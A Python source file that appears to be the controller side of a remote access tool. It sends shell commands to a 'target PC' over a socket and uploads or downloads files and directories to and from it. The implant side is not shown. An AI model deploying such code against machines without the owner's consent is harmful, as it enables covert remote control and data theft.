#!/usr/bin/env 


import socket
import os
import struct
from subprocess import run
from tqdm import tqdm
from handle_files import UploadFile, DownloadFile, UploadDownloadDirectory


class Execute:
    def _create_packet(self, data: str) -> bytes:
        data_bytes = data.encode("utf-8")
        length = len(data_bytes)
        size = struct.pack("<L", length)
        packet = size + data_bytes
        return packet
            
    def _send_packet(self, target: socket.socket, packet: bytes, ) -> None:
        target.sendall(packet)

    def _get_packet(self, target: socket.socket) -> str:
        response_length = struct.unpack("<L", target.recv(4))[0]
        raw_response = target.recv(response_length)
        str_response = raw_response.decode("utf-8")
        return str_response
    
    def _change_directoty(self, command: str) -> None:
        args = command.split()
        if len(args) > 1:
            path = args[-1]
            try:
                os.chdir(path)
            except Exception as ex:
                print(f"Unable to change working directory due to --> {ex}")
        else:
            print("No PATH provided.")
            
    def execute_local(self, cli: str, command: str) -> None:
        if cli == "cd":
            self._change_directoty(command)
            return
        bytes_out = run(command, capture_output=True, shell=True).stdout
        str_out = bytes_out.decode("utf-8")
        print(str_out)
    
    def excute_on_target_pc(self, command: str, target: socket.socket) -> None:
        packet = self._create_packet(command)
        self._send_packet(target, packet)
        str_response = self._get_packet(target)
        print(str_response)
        
    def upload(self, target: socket.socket, path: str, destination: str) -> None:
        packet = self._create_packet("upload")
        self._send_packet(target, packet)
        file = UploadFile(target, path, destination)
        file.upload_file()
        
    def download(self, target: socket.socket, remote_file_path: str, local_destination_file_path: str) -> None:
        packet = self._create_packet("download")
        self._send_packet(target, packet)
        file = DownloadFile(target, remote_file_path, local_destination_file_path)
        file.download_file()
        
    def upload_dir(self, target: socket.socket, origin_path: str, destination: str) -> None:
        packet = self._create_packet("download_dir")
        self._send_packet(target, packet)
        directory = UploadDownloadDirectory(target, origin_path, destination)
        directory.upload_directory()
        
    def download_dir(self, target: socket.socket, origin_path: str, destination: str) -> None:
        packet = self._create_packet("upload_dir")
        self._send_packet(target, packet)
        directory = UploadDownloadDirectory(target, origin_path, destination)
        directory.download_directory()